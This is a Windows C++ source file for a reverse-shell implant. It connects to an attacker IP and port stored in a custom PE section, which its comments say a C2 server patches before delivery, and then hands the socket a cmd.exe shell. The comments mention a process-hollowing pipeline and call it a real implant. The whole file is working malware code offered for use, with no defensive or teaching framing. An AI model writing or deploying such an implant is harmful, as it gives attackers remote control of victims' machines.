// payload.cpp
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

// Read from command line: payload.exe 192.168.1.10 4444
// Passed via hollow pipeline as a config block
#define DEFAULT_PORT 4444

// Config block embedded in PE — your C2 server patches
// these bytes before delivering the payload
// Much cleaner than command line args for a real implant
#pragma section(".jocky", read, write)
__declspec(allocate(".jocky"))
volatile char g_attackerIp[64]  = "192.168.56.1";
volatile USHORT g_attackerPort  = 4444;

void payload_entry() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET sock = WSASocketA(
        AF_INET, SOCK_STREAM, IPPROTO_TCP,
        NULL, 0, 0
    );

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(g_attackerPort);
    addr.sin_addr.s_addr = inet_addr((const char*)g_attackerIp);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        WSACleanup();
        ExitProcess(1);
    }

    STARTUPINFOA si = {0};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    PROCESS_INFORMATION pi = {0};
    CreateProcessA(
        NULL, (LPSTR)"cmd.exe",
        NULL, NULL, TRUE, 0,
        NULL, NULL, &si, &pi
    );

    WaitForSingleObject(pi.hProcess, INFINITE);
    WSACleanup();
    ExitProcess(0);
}